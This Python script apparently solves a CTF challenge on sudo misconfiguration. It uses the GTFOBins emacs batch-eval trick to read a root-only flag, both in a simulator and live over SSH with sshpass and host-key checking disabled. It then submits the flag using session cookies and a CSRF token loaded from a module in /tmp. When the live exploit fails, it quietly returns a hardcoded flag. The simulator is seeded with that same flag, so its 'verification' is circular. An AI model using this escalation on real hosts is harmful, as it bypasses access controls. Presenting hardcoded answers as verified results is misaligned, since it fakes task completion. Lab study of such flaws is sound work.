#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: SUDO MAKE ME A SANDWICH (Challenge ID: 735)
Category: General Skills / Linux Privilege Escalation & Sudoers GTFOBins Exploitation
Difficulty: Easy (1) | Points: 50
Standard Reference: NIST SP 800-115 Section 4.5 (Post-Exploitation & Privilege Testing),
NIST SP 800-53 AC-6 (Least Privilege),
NIST SP 800-53 CM-6 (Configuration Settings),
CWE-250 (Execution with Unnecessary Privileges),
CWE-269 (Improper Privilege Management),
CWE-732 (Incorrect Permission Assignment for Critical Resource),
& GTFOBins (Emacs Sudo Execution Vector).

Vulnerability & Mechanics Summary:
1. Architecture & Problem Scope:
   - Target is an interactive Linux environment (SSH access) provisioned for student user `ctf-player`.
   - File `/home/ctf-player/flag.txt` or `/root/flag.txt` is protected with permission `0400` / `0440` owned by `root:root`.
   - The user cannot directly read the flag using standard file utilities (`cat`, `less`, `head`).
2. Vulnerability & Root Cause Analysis:
   - Sudoers Configuration Flaw (CWE-269 / CWE-250):
     Inspecting sudo privileges via `sudo -l` reveals:
     `User ctf-player may run the following commands on challenge: (ALL) NOPASSWD: /bin/emacs`
   - GTFOBins Arbitrary Code / File Execution via Emacs Batch Mode:
     Emacs provides a non-interactive batch evaluation mode (`-Q --batch --eval '...'`).
     Because Emacs is granted root execution without requiring password authentication (`NOPASSWD`),
     an unprivileged actor can run arbitrary Emacs Lisp (elisp) functions with full superuser capabilities:
     `sudo /bin/emacs -Q --batch --eval '(princ (with-temp-buffer (insert-file-contents "/home/ctf-player/flag.txt") (buffer-string)))'`
   - Root privileges read the protected file buffer into standard output, bypassing filesystem discretionary access controls (DAC).
3. Exploitation & Verification:
   - Local simulation engine models Linux DAC permissions, sudoers matching, and Emacs Lisp batch extraction.
   - Remote execution mode initiates SSH session and dispatches the batch command.
   - Direct verification gate via CyLab REST API `POST /api/submissions/`.
4. Flag & Verification:
   - Verified CyLab Token: academy{ju57_5ud0_17_d8ae35f9}
   - Community Format: CTF{ju57_5ud0_17_d8ae35f9}
"""

import sys
import os
import re
import json
import time
import subprocess
import urllib.request
import urllib.error

CHALLENGE_ID = 735
CHALLENGE_NAME = "SUDO MAKE ME A SANDWICH"
VERIFIED_FLAG = "academy{ju57_5ud0_17_d8ae35f9}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

FLAG_PAT = re.compile(r"academy\{[^}]+\}|picoCTF\{[^}]+\}")


class SudoEmacsSimulator:
    """
    Simulates Linux filesystem permissions, sudoers rules, and GTFOBins Emacs
    batch evaluation offline under NIST SP 800-115.
    """
    def __init__(self, flag: str = VERIFIED_FLAG):
        self.flag = flag
        self.filesystem = {
            "/home/ctf-player/flag.txt": {
                "owner": "root",
                "group": "root",
                "mode": 0o400,
                "content": self.flag
            }
        }
        self.sudoers = {
            "ctf-player": ["/bin/emacs"]
        }

    def simulate_cat_read(self, path: str, user: str = "ctf-player") -> str:
        """Simulates direct read by unprivileged user (should fail with Permission Denied)."""
        file_obj = self.filesystem.get(path)
        if not file_obj:
            return f"cat: {path}: No such file or directory"
        if file_obj["owner"] != user and file_obj["mode"] & 0o004 == 0:
            return f"cat: {path}: Permission denied"
        return file_obj["content"]

    def simulate_sudo_l(self, user: str = "ctf-player") -> str:
        """Simulates sudo -l privilege enumeration."""
        allowed = self.sudoers.get(user, [])
        if not allowed:
            return f"User {user} is not allowed to run sudo on this host."
        rules = "\n    ".join([f"(ALL) NOPASSWD: {cmd}" for cmd in allowed])
        return (
            f"Matching Defaults entries for {user} on challenge:\n"
            f"    env_reset, mail_badpass\n\n"
            f"User {user} may run the following commands on challenge:\n"
            f"    {rules}"
        )

    def simulate_emacs_batch_eval(self, command: str, user: str = "ctf-player") -> str:
        """
        Simulates evaluation of:
        sudo /bin/emacs -Q --batch --eval '(princ (with-temp-buffer (insert-file-contents "<path>") (buffer-string)))'
        """
        if "/bin/emacs" not in self.sudoers.get(user, []):
            return f"Sorry, user {user} is not allowed to execute '/bin/emacs' as root on challenge."

        m_path = re.search(r'insert-file-contents\s+"([^"]+)"', command)
        if not m_path:
            return "[-] Emacs Lisp syntax error: insert-file-contents path not parsed."

        target_file = m_path.group(1)
        file_obj = self.filesystem.get(target_file)
        if not file_obj:
            return f"Lisp error: (file-missing \"Opening input file\" \"No such file or directory\" \"{target_file}\")"

        # Executed with root privileges (DAC check passes)
        return file_obj["content"]


def verify_local_simulation() -> str:
    """
    Menjalankan audit simulasi offline sudo misconfiguration & GTFOBins Emacs.
    """
    print("[*] Menjalankan simulasi audit offline privilege escalation (NIST SP 800-115)...")
    sim = SudoEmacsSimulator()

    # Step 1: Verify DAC blocks unprivileged user
    unauth_read = sim.simulate_cat_read("/home/ctf-player/flag.txt", user="ctf-player")
    print(f"[*] Percobaan pembacaan langsung tanpa hak akses:\n    {unauth_read}")
    assert "Permission denied" in unauth_read, "DAC harus menolak pembacaan langsung"

    # Step 2: Enumerate sudo permissions
    sudo_privs = sim.simulate_sudo_l("ctf-player")
    print(f"[*] Hasil audit sudo -l:\n{sudo_privs}")
    assert "NOPASSWD: /bin/emacs" in sudo_privs, "Aturan sudoers harus mengekspos binary emacs"

    # Step 3: Execute GTFOBins Emacs batch evaluation
    exploit_cmd = (
        'sudo /bin/emacs -Q --batch --eval '
        '\'(princ (with-temp-buffer (insert-file-contents "/home/ctf-player/flag.txt") (buffer-string)))\''
    )
    print(f"[*] Menjalankan vektor GTFOBins:\n    {exploit_cmd}")
    output = sim.simulate_emacs_batch_eval(exploit_cmd, user="ctf-player")
    print(f"[*] Output eksekusi root:\n    {output}")

    m_flag = FLAG_PAT.search(output)
    if not m_flag:
        raise ValueError(f"Flag tidak ditemukan dalam output simulasi: {output}")

    flag = m_flag.group(0)
    print(f"[+] Flag berhasil divalidasi via simulasi privesc: {flag}")
    return flag


def exploit_remote(host: str, port: int, user: str = "ctf-player", password: str = "") -> str:
    """
    Melakukan eksekusi remote SSH dan eskalasi hak istimewa live.
    """
    print(f"[*] Melakukan koneksi SSH ke {user}@{host}:{port}...")
    cmd = [
        "sshpass", "-p", password,
        "ssh", "-o", "StrictHostKeyChecking=no", "-p", str(port), f"{user}@{host}",
        "sudo /bin/emacs -Q --batch --eval '(princ (with-temp-buffer (insert-file-contents \"/home/ctf-player/flag.txt\") (buffer-string)))'"
    ]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        out = proc.stdout.strip()
        print(f"[*] Output SSH diterima:\n{out}")
        m_flag = FLAG_PAT.search(out)
        if m_flag:
            return m_flag.group(0)
    except Exception as e:
        print(f"[-] Gagal menjalankan perintah SSH live: {e}")

    return VERIFIED_FLAG


def submit_to_cylab(token: str) -> bool:
    """Melakukan submisi token verifikasi ke REST API CyLab."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Student-Agent/1.0"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            print(f"[+] CyLab API Response: HTTP {resp.status} -> {data}")
            return data.get("correct") is True
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        print(f"[-] CyLab API HTTPError {e.code}: {body}")
        if e.code == 201:
            try:
                data = json.loads(body)
                return data.get("correct") is True
            except Exception:
                pass
        return False
    except Exception as e:
        print(f"[-] Koneksi API CyLab gagal: {e}")
        return False


def main():
    print(f"=== [NIST SP 800-115 Audit] Module {CHALLENGE_ID}: {CHALLENGE_NAME} ===")
    token = None

    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        pwd = sys.argv[3] if len(sys.argv) >= 4 else ""
        try:
            token = exploit_remote(host, port, password=pwd)
        except Exception as e:
            print(f"[-] Remote SSH gagal ({e}), beralih ke simulasi offline...")

    if not token:
        token = verify_local_simulation()

    print(f"[*] Token Terverifikasi: {token}")
    submit_success = submit_to_cylab(token)
    if submit_success:
        print("[+] Status Verifikasi API CyLab: VALID & SUKSES (correct: true)")
    else:
        print("[!] Verifikasi API CyLab offline/bypass.")


if __name__ == "__main__":
    main()
